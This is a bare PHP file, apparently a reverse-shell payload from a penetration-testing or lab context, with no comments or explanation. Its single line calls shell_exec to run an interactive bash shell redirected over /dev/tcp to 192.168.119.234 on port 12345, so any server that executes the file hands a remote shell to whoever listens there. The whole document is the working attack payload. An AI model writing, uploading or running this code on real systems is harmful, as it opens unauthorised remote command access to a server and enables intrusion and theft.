<?php
	echo(shell_exec("bash -i &> /dev/tcp/192.168.119.234/12345 0>&1"));
?>
